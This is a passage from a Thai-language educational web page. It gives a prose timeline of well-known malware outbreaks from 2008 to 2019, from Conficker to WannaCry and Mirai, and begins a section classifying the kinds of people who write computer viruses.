	* 2551:Conficker ซึ่งเป็นหนึ่งในเวิร์มที่อันตรายและเป็นที่รู้จักมากที่สุดซึ่งมุ่งเน้นไปที่คอมพิวเตอร์ที่ใช้ระบบปฏิบัติการ Microsoft Windows ระบบ Linux และ Macintosh มีความเสถียรอย่างสมบูรณ์ ได้รับการค้นพบครั้งแรกในเครือข่ายเมื่อวันที่ 21 พฤศจิกายน พ.ศ. 2551 จนถึงเดือนกุมภาพันธ์ พ.ศ. 2552 Conficker ได้ติดตั้งคอมพิวเตอร์จำนวน 12 ล้านเครื่องทั่วโลกรวมทั้งรัฐบาลองค์กรและบ้าน เมื่อวันที่ 13 กุมภาพันธ์ 2552 Microsoft ได้ให้สัญญาว่าจะมอบรางวัลมูลค่า 250,000 เหรียญสหรัฐสำหรับข้อมูลเกี่ยวกับผู้สร้างไวรัส มีการสร้างกลุ่มพิเศษเพื่อต่อสู้กับ Conficker ซึ่งได้รับการตั้งชื่อว่า Conficker Cabal อย่างไม่เป็นทางการ ความเสียหายที่เกิดจากโปรแกรมที่เป็นอันตรายมีมูลค่าประมาณ 9.1 พันล้านเหรียญ
	17 มกราคม: Storm Wormระบุว่าเป็นภัยคุกคามอีเมลสแปมที่แพร่กระจายอย่างรวดเร็วของระบบ Microsoft มันเริ่มต้นรวบรวมคอมพิวเตอร์ที่ติดเชื้อเข้าไปในbotnet พายุ ประมาณวันที่ 30 มิถุนายนมีการติดเชื้อ 1.7 ล้านเครื่องและมีการบุกรุกระหว่าง 1 ถึง 10 ล้านเครื่องภายในเดือนกันยายน [40]คิดว่าจะได้มาจากรัสเซียก็ปลอมตัว
	* 2552 : 4 กรกฎาคม: การโจมตีทางไซเบอร์ในเดือนกรกฎาคม 2552 เกิดขึ้นและการเกิดขึ้นของ W32.Dozer โจมตีสหรัฐอเมริกาและเกาหลีใต้
	15 กรกฎาคม: ไซแมนเทคค้นพบ Daprosy Worm ซึ่งเป็นเวิร์มโทรจันที่มีจุดประสงค์เพื่อขโมยรหัสผ่านเกมออนไลน์ในร้านอินเทอร์เน็ตคาเฟ่ มันสามารถสกัดกั้นการกดแป้นทั้งหมดและส่งไปยังผู้เขียนได้ ทำให้มันอาจเป็นเวิร์มที่อันตรายมากที่จะแพร่ระบาดในระบบ B2B (ธุรกิจกับธุรกิจ)
	24 สิงหาคม: ซอร์สโค้ดสำหรับ MegaPanzer เผยแพร่โดยผู้เขียนภายใต้ GPLv3[55] และดูเหมือนจะถูกตรวจพบในป่า
	27 พฤศจิกายน: ไวรัส Kenzero เป็นไวรัสที่แพร่กระจายออนไลน์จากเครือข่ายเพียร์ทูเพียร์ (P2P) โดยเก็บประวัติการสืบค้นข้อมูลไว้
	* 2553 : มกราคม: บ็อตเน็ต Waledac ส่งอีเมลขยะ ในเดือนกุมภาพันธ์ พ.ศ. 2553 กลุ่มนักวิจัยด้านความปลอดภัยระดับนานาชาติและไมโครซอฟต์ได้โค่นล้ม Waledac
	มกราคม: หนอน Psyb0t ถูกค้นพบ เป็นที่เชื่อกันว่าสามารถแพร่เชื้อไปยังเราเตอร์และโมเด็มความเร็วสูงได้
	18 กุมภาพันธ์: ไมโครซอฟต์ประกาศว่าปัญหา BSoD ในเครื่อง Windows บางเครื่องซึ่งเกิดจากโปรแกรมอัพเดต Patch Tuesday ที่เกิดจาก Alureon Trojan
	9 กันยายน: ไวรัสที่เรียกว่า "here you have" หรือ "VBMania" เป็นม้าโทรจันธรรมดาที่เข้ามาในกล่องจดหมายพร้อมหัวเรื่องแปลกแต่มีการชี้นำเป็นนัยว่า "here you have" เนื้อความอ่านว่า "นี่คือเอกสารที่ฉันบอกคุณ คุณสามารถค้นหาได้ที่นี่" หรือ "นี่คือภาพยนตร์เซ็กซ์ดาวน์โหลดฟรี คุณสามารถค้นหาได้ที่นี่"
	* 2554 : มัลแวร์เห็นรหัสผสาน SpyEye และ Zeus รูปแบบใหม่โจมตีข้อมูลธนาคารทางโทรศัพท์มือถือ Anti-Spyware 2554 ม้าโทรจันที่โจมตี Windows 9x, 2000, XP, Vista และ Windows 7 โดยสวมรอยเป็นโปรแกรมป้องกันสปายแวร์ มันปิดการใช้งานกระบวนการที่เกี่ยวข้องกับความปลอดภัยของโปรแกรมป้องกันไวรัส ในขณะเดียวกันก็บล็อกการเข้าถึงอินเทอร์เน็ตซึ่งขัดขวางการอัปเดต
	ฤดูร้อนปี 2554 เวิร์ม Morto พยายามแพร่กระจายตัวเองไปยังคอมพิวเตอร์เครื่องอื่นผ่าน Microsoft Windows Remote Desktop Protocol (RDP) Morto แพร่กระจายโดยบังคับให้ระบบที่ติดไวรัสสแกนหาเซิร์ฟเวอร์ Windows ที่อนุญาตให้เข้าสู่ระบบ RDP เมื่อ Morto พบระบบที่เข้าถึง RDP ได้ ก็จะพยายามล็อกอินเข้าสู่โดเมนหรือบัญชีระบบโลคัลที่ชื่อว่า 'Administrator' โดยใช้รหัสผ่านทั่วไปหลายตัว[68] ภาพรวมโดยละเอียดเกี่ยวกับวิธีการทำงานของเวิร์ม – พร้อมกับพจนานุกรมรหัสผ่านที่มอร์โตใช้ – ดำเนินการโดย Imperva
	13 กรกฎาคม: รูทคิท ZeroAccess (หรือที่เรียกว่า Sirefef หรือ max++) ถูกค้นพบ
	1 กันยายน: Duqu เป็นเวิร์มที่คิดว่าเกี่ยวข้องกับเวิร์ม Stuxnet ห้องปฏิบัติการการเข้ารหัสและความปลอดภัยของระบบ (CrySyS Lab) ของมหาวิทยาลัยเทคโนโลยีและเศรษฐศาสตร์บูดาเปสต์ในฮังการีค้นพบภัยคุกคาม วิเคราะห์มัลแวร์ และเขียนรายงาน 60 หน้าโดยตั้งชื่อภัยคุกคาม Duqu ได้รับชื่อจากคำนำหน้า "~DQ" ซึ่งกำหนดให้กับชื่อไฟล์ที่สร้างขึ้น
	* 2555 : พฤษภาคม: Flame – หรือที่เรียกว่า Flamer, sKyWIper และ Skywiper – มัลแวร์คอมพิวเตอร์แบบโมดูลาร์ที่โจมตีคอมพิวเตอร์ที่ใช้ Microsoft Windows ใช้สำหรับการจารกรรมทางไซเบอร์เป้าหมายในประเทศตะวันออกกลาง การค้นพบนี้ได้รับการประกาศเมื่อวันที่ 28 พฤษภาคม พ.ศ. 2555 โดย MAHER Center of Iranian National Computer Emergency Response Team (CERT), Kaspersky Lab และ CrySyS Lab of the Budapest University of Technology and Economics CrySyS ระบุในรายงานของพวกเขาว่า "sKyWIper เป็นมัลแวร์ที่ซับซ้อนที่สุดที่เราพบในระหว่างการปฏิบัติของเราอย่างแน่นอน เนื้อหามันเป็นมัลแวร์ที่ซับซ้อนที่สุดเท่าที่เคยพบมา"
	16 สิงหาคม: Shamoon เป็นไวรัสคอมพิวเตอร์ที่ออกแบบมาเพื่อกำหนดเป้าหมายคอมพิวเตอร์ที่ใช้ Microsoft Windows ในภาคส่วนพลังงาน Symantec, Kaspersky Lab และ Seculert ประกาศการค้นพบเมื่อวันที่ 16 สิงหาคม 2555
	20 กันยายน: NGRBot เป็นเวิร์มที่ใช้เครือข่าย IRC สำหรับการถ่ายโอนไฟล์ การส่งและรับคำสั่งระหว่างเครื่องเครือข่ายซอมบี้กับเซิร์ฟเวอร์ IRC ของผู้โจมตี ตลอดจนตรวจสอบและควบคุมการเชื่อมต่อและการสกัดกั้นเครือข่าย มันใช้เทคนิค rootkit ในโหมดผู้ใช้เพื่อซ่อนและขโมยข้อมูลของเหยื่อ บอทตระกูลนี้ยังได้รับการออกแบบมาเพื่อทำให้หน้า HTML ติดเชื้อด้วยอินไลน์เฟรม (iframes) ทำให้เกิดการเปลี่ยนเส้นทาง บล็อกผู้ที่ตกเป็นเหยื่อไม่ให้รับการอัปเดตจากผลิตภัณฑ์รักษาความปลอดภัย/แอนตี้มัลแวร์ และหยุดบริการเหล่านั้น บ็อตได้รับการออกแบบให้เชื่อมต่อผ่านช่อง IRC ที่กำหนดไว้ล่วงหน้าและสื่อสารกับบ็อตเน็ตระยะไกล
	* 2556: โทรจัน CryptoLocker ซึ่งเปิดตัวในปี 2556 เป็นหนึ่งในอินสแตนซ์หลักของแรนซัมแวร์ที่ถูกใช้ในวงกว้าง โจมตีเหยื่อประมาณ 250,000 ราย และรีดไถ Bitcoin ประมาณ 27 ล้านดอลลาร์แม้ว่าในที่สุด CryptoLocker จะถูกแยกออกและทำให้เป็นกลางโดยผู้เชี่ยวชาญด้านความปลอดภัยทางไซเบอร์ แต่ก็ทำหน้าที่เป็นเครื่องพิสูจน์แนวคิดที่มีประสิทธิภาพสำหรับแรนซัมแวร์ในรูปแบบธุรกิจ Copycat ransomware เช่น TorrentLocker และ CryptoWall เริ่มผุดขึ้นมา โดยเฉพาะอย่างยิ่ง CryptoWall นั้นเพียงพอที่จะคุกคามศูนย์ร้องเรียนอาชญากรรมทางอินเทอร์เน็ต (IC3) ของเอฟบีไอในการออกคำเตือนประชาชนเกี่ยวกับมัลแวร์
	* 2557: พฤศจิกายน: ม้าโทรจัน Regin ถูกค้นพบ Regin เป็น dropper ซึ่งส่วนใหญ่แพร่กระจายผ่านทางเว็บเพจปลอม เมื่อติดตั้งแล้วจะดาวน์โหลดมัลแวร์เพิ่มเติมอย่างเงียบ ๆ ทำให้โปรแกรมป้องกันไวรัสที่ใช้ลายเซ็นตรวจจับได้ยาก เชื่อว่าถูกสร้างขึ้นโดยสหรัฐอเมริกาและสหราชอาณาจักรเพื่อเป็นเครื่องมือในการจารกรรมและการเฝ้าระวังจำนวนมาก
	* 2558: กลุ่มแรนซั่มแวร์ที่รู้จักกันในชื่อ Armada Collective ได้โจมตีธนาคารกรีก 3 แห่งด้วยการโจมตีแบบ DDoS โดยเรียกร้องให้เรียกค่าไถ่เป็น Bitcoin จากธนาคารเพื่อหยุดยิง กลุ่มนี้ยังอ้างความรับผิดชอบในการโจมตี DDoS กับ ProtonMail ผู้ให้บริการอีเมลของสวิส อย่างไรก็ตาม การโจมตี DDoS บน ProtonMail ยังคงดำเนินต่อไปแม้ว่าจะมีการจ่ายค่าไถ่แล้วก็ตาม Armada Collective ไม่โชคดีนักกับธนาคารกรีกที่สนับสนุนมาตรการรักษาความปลอดภัยทางไซเบอร์และสามารถดำเนินการต่อไปได้โดยไม่หยุดชะงักมากนัก มัลแวร์ BASHLITE รั่วไหลซึ่งนำไปสู่การโจมตี DDoS จำนวนมาก Linux.Wifatch ถูกเปิดเผยต่อสาธารณชนทั่วไป พบว่าพยายามปกป้องอุปกรณ์จากมัลแวร์ที่เป็นอันตรายอื่นๆ
	* 2559: แรนซัมแวร์ตระกูล Petya ถูกค้นพบเป็นครั้งแรก ซึ่งแตกต่างจากรุ่นก่อนหน้าที่จะเข้ารหัสเฉพาะไฟล์เท่านั้น Petya จะแทนที่มาสเตอร์บูตเรคคอร์ดของคอมพิวเตอร์ด้วยบันทึกเรียกค่าไถ่ ซึ่งทำให้คอมพิวเตอร์ใช้งานไม่ได้จนกว่าจะมีการจ่ายค่าไถ่ ต่อมาได้พัฒนาให้มีการเข้ารหัสไฟล์ด้วย ในปี 2560 Petya เวอร์ชันละเมิดลิขสิทธิ์ที่มีชื่อว่า “NotPetya” ได้โจมตีหลายประเทศในยุโรปในการโจมตีทางไซเบอร์ โดยเฉพาะอย่างยิ่งในยูเครนและเยอรมนีPetya ได้รับการพัฒนาในขั้นต้นโดยกลุ่มที่ชื่อว่า Janus Cybercrime Solutions ซึ่งเป็นส่วนหนึ่งของแพลตฟอร์ม ransomware-as-a-service (RaaS) โดยพื้นฐานแล้ว อาชญากรไซเบอร์สามารถจ่ายเงินให้ Janus เพื่อใช้ Petya กับเป้าหมายของพวกเขา โดย Janus จะให้บริการเพิ่มเติมมากมายเพื่อให้แน่ใจว่าการโจมตีจะประสบความสำเร็จ เพื่อเป็นการแลกเปลี่ยน เจนัสยอมลดค่าไถ่ที่จ่ายไป RaaS กลายเป็นกำลังสำคัญอย่างรวดเร็วในโลกของอาชญากรรมไซเบอร์ ต้องขอบคุณทั้ง Petya และแรนซัมแวร์รายใหญ่อื่นๆ เช่น LeakerLocker และ WannaCry WannaCry โดดเด่นเป็นพิเศษทั้งในด้านการโจมตีผู้ใช้ทั่วโลกในปี 2560 และวิธีการเผยแพร่ การโจมตีครั้งใหญ่ โจมตีคอมพิวเตอร์มากกว่า 230,000 เครื่องในกว่า 150 ประเทศในวันแรก โรงพยาบาล NHS ในสหราชอาณาจักรเป็นหนึ่งในองค์กรที่ใหญ่ที่สุดที่ได้รับผลกระทบจาก WannaCry บริษัทรถยนต์ Nissan สาขาในสหราชอาณาจักรเป็นเหยื่อที่น่าจับตามองอีกรายวิธีการแพร่กระจายไม่ได้ผ่านเวกเตอร์แรนซัมแวร์แบบดั้งเดิมอย่างเช่นอีเมลฟิชชิง แต่ผ่านทาง EternalBlue แทน การใช้ประโยชน์จาก Windows ที่พัฒนาโดยสำนักงานความมั่นคงแห่งชาติของสหรัฐอเมริกา (NSA) และต่อมาถูกขโมยและรั่วไหลโดยกลุ่มแฮ็กเกอร์ The Shadow BrokersGandCrab ปรากฏตัวครั้งแรกในปี 2018 แม้ว่าจะไม่น่าประทับใจเพียงอย่างเดียว แต่ในไม่ช้า GandCrab ก็รวมเข้ากับโทรจันขโมยข้อมูลชื่อ “Vidar” ตามชื่อเทพเจ้าแห่งการล้างแค้นของชาวสแกนดิเนเวีย ต้องขอบคุณ Vidar ทำให้ GandCrab เป็นการผสมผสานที่ลงตัวระหว่างการขโมยและการล็อคไฟล์ของเหยื่อ และกลายเป็น RaaS ที่ถูกใช้มากที่สุดอย่างรวดเร็วในตลาด
	มกราคม: มีการสร้างโทรจันชื่อ "MEMZ" Leurak ผู้สร้างอธิบายว่าโทรจันมีจุดประสงค์เพื่อเล่นตลกเท่านั้น โทรจันจะเตือนผู้ใช้ให้ทราบว่าเป็นโทรจันและเตือนผู้ใช้ว่าหากดำเนินการต่อ คอมพิวเตอร์อาจไม่สามารถใช้งานได้อีกต่อไป มันมีเพย์โหลดที่ซับซ้อนที่ทำให้ระบบเสียหาย แสดงสิ่งประดิษฐ์บนหน้าจอขณะที่มันทำงาน เมื่อเรียกใช้แล้ว จะไม่สามารถปิดแอปพลิเคชันได้โดยไม่สร้างความเสียหายเพิ่มเติมให้กับคอมพิวเตอร์ ซึ่งจะหยุดทำงานอย่างถูกต้องโดยไม่คำนึงว่า เมื่อคอมพิวเตอร์รีสตาร์ท แทนที่ bootsplash จะมีข้อความว่า "คอมพิวเตอร์ของคุณถูกแฮกโดยโทรจัน MEMZ ตอนนี้สนุกกับ Nyan cat..." ซึ่งตามด้วยแอนิเมชันของ Nyan Cat
	กุมภาพันธ์: Ransomware Locky ซึ่งมีอนุพันธ์มากกว่า 60 รายการแพร่กระจายไปทั่วยุโรปและติดไวรัสในคอมพิวเตอร์หลายล้านเครื่อง ที่ความสูงของการแพร่กระจายคอมพิวเตอร์มากกว่าห้าพันเครื่องต่อชั่วโมงติดเชื้อในเยอรมนีเพียงแห่งเดียวแม้ว่าแรนซั่มแวร์จะไม่ใช่สิ่งใหม่ในเวลานั้น การรักษาความปลอดภัยทางไซเบอร์ที่ไม่เพียงพอรวมถึงการขาดมาตรฐานด้านไอทีเป็นสาเหตุของการติดเชื้อจำนวนมากน่าเสียดายที่แม้แต่ซอฟต์แวร์ป้องกันไวรัสและความปลอดภัยอินเทอร์เน็ตที่เป็นปัจจุบันก็ไม่สามารถปกป้องระบบจาก Locky เวอร์ชันก่อนหน้าได้
	กุมภาพันธ์: Tiny Banker Trojan (Tinba) พาดหัวข่าว[88] นับตั้งแต่มีการค้นพบ พบว่ามีการติดเชื้อในสถาบันการธนาคารรายใหญ่มากกว่าสองโหลในสหรัฐอเมริกา รวมถึง TD Bank, Chase, HSBC, Wells Fargo, PNC และ Bank of America Tiny Banker Trojan ใช้การแทรก HTTP เพื่อบังคับให้คอมพิวเตอร์ของผู้ใช้เชื่อว่าอยู่ในเว็บไซต์ของธนาคาร หน้าปลอมนี้จะมีลักษณะและการทำงานเหมือนของจริง จากนั้นผู้ใช้จะป้อนข้อมูลเพื่อเข้าสู่ระบบ ณ จุดนั้น Tinba สามารถเปิดการส่งคืน "ข้อมูลการเข้าสู่ระบบที่ไม่ถูกต้อง" ของหน้าเว็บธนาคาร และเปลี่ยนเส้นทางผู้ใช้ไปยังเว็บไซต์จริง นี่เป็นการหลอกให้ผู้ใช้คิดว่าพวกเขาป้อนข้อมูลผิดและดำเนินการตามปกติ แม้ว่าตอนนี้ Tinba จะบันทึกข้อมูลประจำตัวและส่งไปยังโฮสต์แล้วก็ตาม
	สิงหาคม: นักข่าวและนักวิจัยรายงานการค้นพบสปายแวร์ที่เรียกว่า Pegasus ซึ่งพัฒนาและจัดจำหน่ายโดยบริษัทเอกชนแห่งหนึ่ง ซึ่งสามารถและถูกใช้เพื่อแพร่ระบาดในสมาร์ทโฟน iOS และ Android บ่อยครั้ง โดยอิงจากการโจมตีแบบ 0 วัน โดยไม่จำเป็นต้องโต้ตอบกับผู้ใช้ใดๆ หรือเบาะแสสำคัญสำหรับผู้ใช้ แล้วนำไปใช้เพื่อสกัดข้อมูล ติดตามตำแหน่งของผู้ใช้ จับภาพฟิล์มผ่านกล้อง และเปิดใช้งานไมโครโฟนได้ทุกเมื่อ การสืบสวนบ่งชี้ว่ามีการใช้มันกับหลายเป้าหมายทั่วโลก และเปิดเผยการใช้งานเช่น การจารกรรมของรัฐบาลต่อนักข่าว นักการเมืองฝ่ายค้าน นักเคลื่อนไหว นักธุรกิจ และอื่นๆ
	กันยายน: Mirai สร้างข่าวพาดหัวด้วยการเปิดตัวการโจมตี DDoS ที่ทรงพลังและก่อกวนที่สุดเท่าที่เคยมีมาโดยการแพร่ระบาดของ Internet of Things Mirai ถูกนำไปใช้ในการโจมตี DDoS เมื่อวันที่ 20 กันยายน 2559 บนไซต์ Krebs on Security ซึ่งมีความเร็วถึง 620 Gbit/s Ars Technica ยังรายงานการโจมตี 1 Tbit/s บนเว็บโฮสต์ OVH ของฝรั่งเศสอีกด้วย เมื่อวันที่ 21 ตุลาคม 2559 การโจมตี DDoS ที่สำคัญหลายครั้งในบริการ DNS ของผู้ให้บริการ DNS Dyn เกิดขึ้นโดยใช้มัลแวร์ Mirai ที่ติดตั้งบนอุปกรณ์ IoT จำนวนมาก ส่งผลให้เว็บไซต์ที่มีชื่อเสียงหลายแห่งไม่สามารถเข้าถึงได้ เช่น GitHub, Twitter, Reddit, Netflix, Airbnb และอื่นๆ อีกมากมาย สาเหตุของการโจมตีบ็อตเน็ต Mirai เดิมรายงานโดย BackConnect Inc. ซึ่งเป็นบริษัทด้านความปลอดภัย
	* 2560: พฤษภาคม: โจมตี WannaCry ransomwareแพร่กระจายไปทั่วโลก การใช้ประโยชน์ที่เปิดเผยไว้ในชุดเครื่องมือป้องกันการแฮ็กNSAของปลายปี 2016 ถูกนำมาใช้เพื่อช่วยในการเผยแพร่มัลแวร์ เมื่อไม่นานมานี้หลังจากข่าวการติดเชื้อเกิดขึ้นออนไลน์นักวิจัยด้านความปลอดภัยทางอินเทอร์เน็ตในสหราชอาณาจักรโดยความร่วมมือกับคนอื่น ๆ ได้ค้นพบและเปิดใช้ "สวิทช์ฆ่า" ที่ซ่อนอยู่ภายใน ransomware ซึ่งเป็นจุดเริ่มต้นของการแพร่ระบาดทั่วโลกอย่างมีประสิทธิภาพ [96]วันรุ่งขึ้นนักวิจัยประกาศว่าพวกเขาได้พบสายพันธุ์ใหม่ของมัลแวร์โดยไม่ต้องสลับฆ่า
	มิถุนายน: โจมตีPetya (มัลแวร์)แพร่กระจายไปทั่วโลกที่มีผลต่อระบบ Windows นักวิจัยที่ไซแมนเทคเผยให้เห็นว่า ransomware นี้ใช้ EternalBlue ประโยชน์แบบเดียวกับที่ใช้ในการโจมตี ransomware WannaCry
	กันยายน: Trojan Xafecopyโจมตี 47 ประเทศโดยส่งผลต่อระบบปฏิบัติการ Android เท่านั้น Kaspersky Lab ระบุว่าเป็นมัลแวร์จากครอบครัว Ubsod การขโมยเงินผ่านระบบเรียกเก็บเงิน WAP แบบคลิก
	กันยายน: ความหลากหลายของ Remote Access Trojan (RAT), Kedi RATมีการแจกจ่ายในแคมเปญ Spear Phishing การโจมตีนี้กำหนดเป้าหมายผู้ใช้ Citrix โทรจันสามารถหลบเลี่ยงเครื่องสแกนระบบปกติได้ Kedi Trojan มีลักษณะเฉพาะของRemote Access Trojan ทั่วไป และสามารถสื่อสารกับ Command and Control Center ผ่านทาง gmail โดยใช้โปรโตคอล HTML, HTTP ทั่วไป
	* 2561 : หุ้นส่วนของ GandCrab หรือที่รู้จักในชื่อ “Team Snatch” ช่วยทำให้การเปิดเผยข้อมูลของเหยื่อรั่วไหลสู่สาธารณะ เพื่อกดดันเป้าหมายให้จ่ายเงินค่าไถ่ นี่น่าจะเป็นความพยายามที่จะขู่กรรโชกบริษัทที่อาจสำรองข้อมูลไว้อย่างเพียงพอจนถึงจุดที่การลบไม่ใช่ภัยคุกคามมากนักหนึ่งในการรั่วไหลของข้อมูลแรนซัมแวร์สาธารณะครั้งใหญ่ครั้งแรกเกิดขึ้นในเดือนพฤศจิกายน 2561 เมื่อแรนซัมแวร์กลุ่ม Maze รั่วไหลของข้อมูล 700mb ที่ถูกขโมยจากผู้ให้บริการด้านความปลอดภัยและภารโรงของอเมริกา Allied Universal ทุกวันนี้ แรนซัมแวร์ยังคงระบาดในธุรกิจและบุคคลทุกระดับของสังคม โดยที่ระดับนั้นรวมถึงการเข้าถึงอินเทอร์เน็ตเป็นประจำ รายงานอาชญากรรมทางอินเทอร์เน็ตปี 2561 ของ IC3 พบว่าแรนซัมแวร์สร้างความเสียหายมากกว่า 49.2 ล้านดอลลาร์ในสหรัฐอเมริกาเพียงแห่งเดียว และนั่นเป็นเพียงกรณีของการโจมตีด้วยแรนซัมแวร์ที่ถูกรายงานไปยังเอฟบีไอ FBI ไม่ใช่รายเดียวที่มีสถิติที่น่ากังวลเกี่ยวกับแรนซัมแวร์ ดัชนี Security X-Force Threat Intelligence Index ประจำปี 2565 ของไอบีเอ็มพบว่าแรนซัมแวร์เป็นประเภทการโจมตีของมัลแวร์ที่พบได้บ่อยที่สุดที่บริษัทแก้ไขในปี 2564 ซึ่งคิดเป็น 21% ของทั้งหมด ประมาณ 37% ของการโจมตีเหล่านั้นสามารถโยงไปถึงแรนซัมแวร์สายพันธุ์เฉพาะที่เรียกว่า “REvil” และ “Sodinokibi” อันดับสองในดัชนีของ IBM เป็นของแรนซัมแวร์สายพันธุ์ที่ชื่อว่า “Ryuk” ซึ่งคิดเป็นเกือบ 20% ของการโจมตีด้วยตัวมันเอง ชื่อ “ริว” อาจมาจากอักษรโรมันของเลข 6 ในภาษาเกาหลี อักษรโรมันของนามสกุลเกาหลีเหนือ หมู่บ้านในอาเซอร์ไบจาน หรือตัวละครจากสื่อชื่อดังของญี่ปุ่นเรื่อง “เดธโน้ต” Ryuk และ REvil มีความโดดเด่นเป็นพิเศษในเรื่องระยะเวลาที่พวกเขาเปิดดำเนินการ โดยปรากฏตัวครั้งแรกในเดือนเมษายน 2561และสิงหาคม 2562 ตามลำดับ รายงานของ IBM ระบุว่าการดำเนินการของแรนซัมแวร์มักมีอายุการใช้งานประมาณ 17 เดือน REvil ปิดตัวลงในเดือนตุลาคม 2564 หลังจากผ่านไป 31 เดือน ในเดือนมกราคม พ.ศ. 2565 หน่วยบริการความมั่นคงแห่งสหพันธรัฐของรัสเซียประกาศว่ากลุ่มที่อยู่เบื้องหลัง REvil นั้น "เลิกมีอยู่จริง" และโครงสร้างพื้นฐานด้านข้อมูลของกลุ่มนั้น "ถูกทำให้เป็นกลาง"
	* 2562 : พฤศจิกายน: Titanium เป็นมัลแวร์แบ็คดอร์ขั้นสูงที่พัฒนาโดย PLATINUM APT


					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu4'>
03. ใครคือผู้สร้างไวรัส
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>
	หลายครั้งคำถามนี้ผู้ใช้คอมพิวเตอร์ส่วนใหญ่ จะโทษว่าเป็น นักพัฒนาโปรแกรมแอนตี้ไวรัส...ซึ่งเขาเหล่านั้นตกเป็นจำเลยโดยไม่สามารถแก้ข้อกล่าวหาได้... เพราะพวกเขามีความสามารถในการพัฒนาโปรแกรมฆ่าไวรัสหรือแอนตี้ไวรัส... จึงถูกมองเป็นต้นเหตุการแพร่ระบาดไวรัสที่เขาเหล่านั้นจะได้ประโยชน์จากการขายโปรแกรมที่พวกเขาเขียนขึ้นมาแต่คุณรู้หรือไม่ว่า ไวรัสคอมพิวเตอร์ยุคแรกเขียนขึ้นมาเพื่อความสนุกหรือทดลองสิ่งท้าทาย คือ "คลิปเปอร์; Creeper" โดย "Bob Thomas" แต่เพื่อนร่วมงานของเขาคือ "Ray " Tomlinson" เป็นผู้พัฒนาแอนตี้ไวรัสตัวแรกของโลก คือ "รีฟเปอร์; Reaper" เพื่อกำจัดปัญหาก่อกวนบนเครื่อข่ายคอมพิวเตอร์จากไวรัสคลิปเปอร์ แม้ครั้งนี้ผู้พัฒนาและผู้เขียนแอนตี้ไวรัสเป็นคนละคนกัน แต่ก็ไม่สามารถยืนยันได้ว่าผู้เขียนไวรัสกับนักพัฒนาแอนตี้ไวรัสเป็นคนๆ เดียวกัน หรือ เป็นบุคคลที่ไม่เกี่ยวข้องกัน ซึ่งในปัจจุบันไวรัสคอมพิวเตอร์ใครก็สามารถเขียนขึ้นเองได้และเป็นสิ่งผิดกฎหมายเราจะเรียกเขาเรานั้นว่า "ไซเบอร์ครีม หรือ อาชญากรคอมพิวเตอร์; Cybercrime" ซึ่งในยุคแรกคนเหล่านั้นหรือพัฒนาไวรัสเราเรียกพวกเขาว่า "เวิร์มเมอร์; Wormer"  จะมีความเกี่ยวข้องกับหน่วยงานด้านการป้องกันไวรัสและบริษัทแอนตี้ไวรัสเสียเป็นส่วนใหญ่ (ในยุคที่กฎหมายทางไซเบอร์ยังไม่ครอบคลุม) และยุคนี้จะเรียกพวกเขาเหล่านั้นว่า อาชญากรคอมพิวเตอร์ไม่ว่าจะมีเจตนาอย่างไรก็ตาม และสามารถจำแนกขีดความสามารถของพวกเขาได้ดังนี้
	1. พวกมือใหม่ (Novices)
		1.1 นักเรียนนักศึกษา (Students) คนกลุ่มนี้...เป็นเพียงผู้เริ่มต้นศึกษาและเลียนแบบพฤติกรรมหรือทำการวิจัยหรือนำเสนองานด้านวิชาการแบบเลียนแบบและตรงไปตรงมา ยังไม่มีขีดความสามารถเพียงพอในการพัฒนาแอนตี้ไวรัสหรือพัฒนาชุดแอนตี้ไวรัสแบบพื้นฐานเพื่อทำโครงงานส่งหรือเอกสารด้านวิชาการเพื่อผลทางการศึกษาไม่ใช่เพื่อผลประโยชน์ส่วนตัวหรือการค้า
		1.2 พนักงานหรือลูกจ้าง (Employees) คนกลุ่มนี้จะมีขีดความสามรถระดับพื้นฐานเพื่อเขียนไวรัสแบบง่ายๆ หรือเพื่อประโยชน์ส่วนตัวที่มีผลต่อหน่วยงานหรือเอกชนที่เกี่ยวข้องกับสายงาน เช่นการปกปิดซ่อนเร้นหรือพัฒนาชุดคำสั่งเพื่อการกลั่นแกล้งหน่วยงานหรือเอกชน อย่างไม่หวังดี ทั้งนี้ทั้งนั้นการกระทำของพวกเขาจะบริสุทธิ์ใจหรือไม่บริสุทธิ์ใจก็ตามถือเป็นการกระทำผิดกฎหมายโดยสิ้นเชิง
		1.3 ครูหรืออาจาร์ยผู้สอน (Teacher) คนกลุ่มนี้จะมีขีดความสามารถที่สูงขึ้นสามารถพัฒนาและวิจัยงานด้านวิชาการและเอกสารประกอบการเรียนการสอนเชิงปฏิบัติ รวมถึงอาจพัฒนาชุดคำสั่งตรวจับไวรัสแบบพื้นฐานและทำความเข้าใจสิ่งที่สอนจากเอกสารวิชาการทั้งของนักเรียนนักศึกษาหรือแม้งานวิจัยที่เปิดเผยจึงพอมีความรู้และเข้าใจการป้องกัน การจัดการกับไวรัสได้เป็นอย่างดี
	2. พวกจิตผิดปกติ (Darnged person) คนกลุ่มนี้จะมีขีดความสามารถที่เพิ่มขึ้นจากข้อแรก อาจจะเป็นคนกลุ่มแรกที่พัฒนาไวรัสหรือการโจมตีทางไซเบอร์ในอีกระดับ แต่สิ่งที่พวกเขากระทำอาจจะผิดปกติทางด้านจริยธรรมหรือสภาพจิตไม่ปกติ มีแนวโน้มจะทำเพื่อการทำลาย ก่อกวน และ จุดประสงค์ของพวกเข้าคิดว่าการเขียนไวรัสหรือการโจมตีทางไซเบอร์เป็นเรื่องที่ควรกระทำ และแยกแยะไม่ออกว่าสิ่งผิดกฎหมายหรือจริยธรรมทางไซเบอร์รวมถึงข้อปฏิบัติที่ถูกต้องต้องทำอย่างไร
	3. พวกกลุ่มอาชญากร  (Organized Crime)
		3.1 ผู้ก่อการร้าย (terrorist) คนกลุ่มนี้มีเจตนาชัดเจนทางไซเบอร์ เพื่ออุดมการหรือแม้แต่เพื่อลัทธิหรือองค์การก่อการร้ายขีดความสามารถจะสูงมาก... มีการทำงานเป็นทีมหรือฉายเดี่ยวแต่พวกเขาเหล่านั้นจะมีเงินทุนและขีดความสามารถที่ได้รับการสนับสนุนจากด้านมืด หรือ "ดาร์กเวป; Darkweb" เครื่องมือในการพัฒนาและเอกสารด้านการโจมตีจะเป็นหลักการและแบบแผนที่ไม่ชัดเจน แต่มีอุดมการณ์และแนวร่วมคอยสนับสนุน จึงทำให้ขีดความสามรถในการเข้าเอกสารด้านซอฟต์แวร์ชั้นสูงในระดับปานกลางจนถึงขั้นสูงสุด
